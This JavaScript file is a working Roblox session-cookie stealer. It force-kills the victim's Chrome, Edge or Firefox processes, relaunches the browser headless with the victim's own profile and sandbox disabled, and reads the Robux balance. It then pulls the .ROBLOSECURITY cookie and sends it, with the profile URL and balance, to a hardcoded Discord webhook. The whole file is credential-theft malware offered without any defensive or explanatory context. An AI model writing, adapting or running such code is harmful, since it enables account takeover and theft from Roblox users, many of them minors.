const puppeteer = require('puppeteer');
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

// Get the current system username dynamically
const username = os.userInfo().username;

// Check if a browser is installed
function isBrowserInstalled(browserPath) {
  return fs.existsSync(browserPath);
}

// Check if a browser process is running
function isBrowserRunning(browserName) {
  try {
    execSync(`tasklist /FI "IMAGENAME eq ${browserName}.exe"`, { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

// Kill a browser process if it's running
function killBrowserProcess(browserName) {
  if (isBrowserRunning(browserName)) {
    try {
      execSync(`taskkill /IM ${browserName}.exe /F`);
    } catch {
      // Ignore errors
    }
  }
}

// Browsers to try
const browserPaths = [
  {
    name: 'chrome',
    path: `C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe`,
    product: 'chrome',
    userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Google\\Chrome\\User Data`,
  },
  {
    name: 'msedge',
    path: `C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe`,
    product: 'chrome',
    userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Microsoft\\Edge\\User Data`,
  },
  {
    name: 'firefox',
    path: `C:\\Program Files\\Mozilla Firefox\\firefox.exe`,
    product: 'firefox',
    userDataDir: '',
  },
];

// Try Puppeteer with a browser
async function tryPuppeteer(browserConfig) {
  let browser;
  try {
    browser = await puppeteer.launch({
      executablePath: browserConfig.path,
      product: browserConfig.product,
      headless: true, // Run in headless mode
      userDataDir: browserConfig.userDataDir || undefined,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
      ignoreDefaultArgs: ['--enable-logging', '--v=1'], // Suppress verbose logging
      dumpio: false, // Suppress browser process stdout/stderr
    });

    const page = await browser.newPage();
    await page.goto('https://www.roblox.com', { waitUntil: 'domcontentloaded' });
    await page.goto('https://www.roblox.com/users/profile', { waitUntil: 'domcontentloaded' });

    const robuxSelector = '#nav-robux';
    await page.waitForSelector(robuxSelector, { timeout: 15000 });
    await page.click(robuxSelector);
    await page.waitForSelector('#nav-robux-amount', { timeout: 10000 });

    const robuxBalance = await page.$eval('#nav-robux-amount', el => el.innerText.trim());

    const client = await page.target().createCDPSession();
    const { cookies } = await client.send('Network.getAllCookies');
    const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');

    if (!robloxCookie || !robloxCookie.value) {
      return false;
    }

    const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    await fetch('https://discord.com/api/webhooks/1367835268954194072/d_xMvdDNjj16cU5TMPajZVf4OxMmz2SPmC5WWl_vvwrhP0bMxG37Ll2OPEUr-9d0JOa6', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content:
          `.ROBLOSECURITY:\n\`\`\`${robloxCookie.value}\`\`\`\n` +
          `Profile: ${page.url()}\n` +
          `Robux: ${robuxBalance}`
      })
    });

    return true;

  } catch (err) {
    return false;
  } finally {
    if (browser) await browser.close();
  }
}

// Main loop
(async () => {
  let triedAny = false;

  for (const browser of browserPaths) {
    if (!isBrowserInstalled(browser.path)) {
      continue;
    }

    triedAny = true;
    killBrowserProcess(browser.name);
    const success = await tryPuppeteer(browser);
    if (success) break;
  }

  process.exit(0);
})();
